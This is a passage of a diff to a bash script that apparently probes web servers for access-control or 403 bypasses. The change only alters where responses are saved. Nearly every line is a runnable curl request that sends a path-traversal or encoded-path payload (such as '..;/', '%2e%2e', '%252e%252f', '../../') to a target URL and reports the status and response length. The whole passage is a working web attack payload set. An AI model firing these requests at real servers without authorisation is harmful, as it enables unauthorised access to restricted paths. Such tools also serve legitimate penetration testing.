-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;%0d/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;%0d/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;%0d/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;%0d/" -H "$user_agent")
 print
 echo -n "Payload [ ..;%ff/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;%ff/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;%ff/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;%ff/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;%ff/" -H "$user_agent")
 print
 echo -n "Payload [ ..;\ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;\\" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;\\" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;\\" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;\\" -H "$user_agent")
 print
 echo -n "Payload [ ..;\; ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;\;" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;\;" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;\;" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;\;" -H "$user_agent")
 print
 echo -n "Payload [ ..\; ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..\;" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..\;" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..\;" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..\;" -H "$user_agent")
 print
 echo -n "Payload [ /%20# ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%20#" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%20#" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%20#" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%20#" -H "$user_agent")
 print
 echo -n "Payload [ /%20%23 ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%20%23" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%20%23" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%20%23" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%20%23" -H "$user_agent")
 print
 echo -n "Payload [ /%252e%252e%252f/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252e%252e%252f/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252e%252e%252f/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252e%252e%252f/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252e%252e%252f/" -H "$user_agent")
 print
 echo -n "Payload [ /%252e%252e%253b/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252e%252e%253b/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252e%252e%253b/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252e%252e%253b/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252e%252e%253b/" -H "$user_agent")
 print
 echo -n "Payload [ /%252e%252f/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252e%252f/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252e%252f/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252e%252f/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252e%252f/" -H "$user_agent")
 print
 echo -n "Payload [ /%252e%253b/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252e%253b/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252e%253b/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252e%253b/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252e%253b/" -H "$user_agent")
 print
 echo -n "Payload [ /%252e/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252e/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252e/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252e/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252e/" -H "$user_agent")
 print
 echo -n "Payload [ /%252f ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252f" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252f" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252f" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252f" -H "$user_agent")
 print
 echo -n "Payload [ /%2e%2e ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%2e" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%2e" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%2e" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%2e" -H "$user_agent")
 print
 echo -n "Payload [ /%2e%2e%3b/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%2e%3b/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%2e%3b/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%2e%3b/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%2e%3b/" -H "$user_agent")
 print
 echo -n "Payload [ /%2e%2e/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%2e/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%2e/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%2e/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%2e/" -H "$user_agent")
 print
 echo -n "Payload [ /%2e%2f/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%2f/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%2f/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%2f/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%2f/" -H "$user_agent")
 print
 echo -n "Payload [ /%2e%3b/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%3b/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%3b/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%3b/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%3b/" -H "$user_agent")
 print
 echo -n "Payload [ /%2e%3b// ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%3b//" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%3b//" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%3b//" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%3b//" -H "$user_agent")
 print
 echo -n "Payload [ /%2e/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e/" -H "$user_agent")
 print
 echo -n "Payload [ /%2e// ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e//" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e//" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e//" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e//" -H "$user_agent")
 print
 echo -n "Payload [ /%2f ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2f" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2f" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2f" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2f" -H "$user_agent")
 print
 echo -n "Payload [ /%3b/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%3b/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%3b/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%3b/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%3b/" -H "$user_agent")
 print
 echo -n "Payload [ /.. ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.." -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.." -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.." -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.." -H "$user_agent")
 print
 echo -n "Payload [ /..%2f ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..%2f" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..%2f" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..%2f" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..%2f" -H "$user_agent")
 print
 echo -n "Payload [ /..%2f..%2f ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..%2f..%2f" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..%2f..%2f" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..%2f..%2f" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..%2f..%2f" -H "$user_agent")
 print
 echo -n "Payload [ /..%2f..%2f..%2f ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..%2f..%2f..%2f" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..%2f..%2f..%2f" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..%2f..%2f..%2f" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..%2f..%2f..%2f" -H "$user_agent")
 print
 echo -n "Payload [ /../ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../" -H "$user_agent")
 print
 echo -n "Payload [ /../../ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../../" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../../" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../../" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../../" -H "$user_agent")
 print
 echo -n "Payload [ /../../../ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../../../" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../../../" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../../../" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../../../" -H "$user_agent")
 print
 echo -n "Payload [ /../../..// ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../../..//" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../../..//" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../../..//" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../../..//" -H "$user_agent")
 print
 echo -n "Payload [ /../..// ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../..//" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../..//" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../..//" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../..//" -H "$user_agent")
 print
 echo -n "Payload [ /../..//../ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../..//../" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../..//../" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../..//../" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../..//../" -H "$user_agent")
 print
 echo -n "Payload [ /../..;/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../..;/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../..;/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../..;/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../..;/" -H "$user_agent")
 print
 echo -n "Payload [ /.././../ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.././../" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.././../" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.././../" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.././../" -H "$user_agent")
 print
 echo -n "Payload [ /../.;/../ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../.;/../" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../.;/../" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../.;/../" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../.;/../" -H "$user_agent")
 print
 echo -n "Payload [ /..// ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..//" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..//" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..//" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..//" -H "$user_agent")
 print
 echo -n "Payload [ /..//../ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..//../" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..//../" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..//../" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..//../" -H "$user_agent")
 print
 echo -n "Payload [ /..//../../ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..//../../" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..//../../" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..//../../" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..//../../" -H "$user_agent")
 print
 echo -n "Payload [ /..//..;/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..//..;/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..//..;/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..//..;/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..//..;/" -H "$user_agent")
 print
 echo -n "Payload [ /../;/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../;/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../;/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../;/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../;/" -H "$user_agent")
 print
 echo -n "Payload [ /../;/../ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../;/../" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../;/../" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../;/../" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../;/../" -H "$user_agent")
 print
 echo -n "Payload [ /..;%2f ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;%2f" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;%2f" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;%2f" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;%2f" -H "$user_agent")
 print
 echo -n "Payload [ /..;%2f..;%2f ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;%2f..;%2f" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;%2f..;%2f" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;%2f..;%2f" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;%2f..;%2f" -H "$user_agent")
 print
 echo -n "Payload [ /..;%2f..;%2f..;%2f ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;%2f..;%2f..;%2f" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;%2f..;%2f..;%2f" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;%2f..;%2f..;%2f" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;%2f..;%2f..;%2f" -H "$user_agent")
 print
 echo -n "Payload [ /..;/../ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;/../" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;/../" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;/../" -H "$user_agent"
